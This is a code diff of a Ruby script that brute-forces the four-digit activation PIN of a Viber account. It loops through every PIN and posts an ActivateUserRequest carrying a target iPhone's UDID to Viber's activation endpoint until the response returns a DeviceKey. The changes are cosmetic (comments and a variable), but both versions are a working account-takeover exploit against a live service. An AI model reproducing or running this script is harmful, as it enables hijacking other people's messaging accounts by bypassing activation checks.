@@ -61,7 +61,7 @@ opts = Trollop::options do
 end
 
 ########################################################################################
-# LETS HAVE SOME FUN THIS BEAT IS SICK.
+# Do the magic.
 ########################################################################################
 puts "[+] Figuring out PIN for #{opts[:iphone_udid]}. This could take a while."
 
@@ -73,15 +73,21 @@ puts "[+] Figuring out PIN for #{opts[:iphone_udid]}. This could take a while."
       pin   = "%04d" % j
 
       # Post KEY => VAL
+      key   = "XMLDOC"
       value = "<ActivateUserRequest><UDID>#{opts[:iphone_udid]}</UDID><ActivationCode>#{pin}</ActivationCode><ProtocolVersion>10</ProtocolVersion></ActivateUserRequest>" 
 
       # GO GO GO
       url = "http://wa.viber.com/viber/viber.php?function=ActivateUser"
       uri = URI.parse(url)
+            
+      # Craft post
       req = Net::HTTP::Post.new(url)
-      req.set_form_data({"XMLDOC" => value})
+      req.set_form_data({key => value})
+      
+      # Execute
       res = Net::HTTP.new(uri.host, uri.port).start { |http| http.request(req) }
 
+      # Success?
       if /.*DeviceKey.*/.match res.body
         puts "[+] Success: found PIN: #{pin}"
         exit
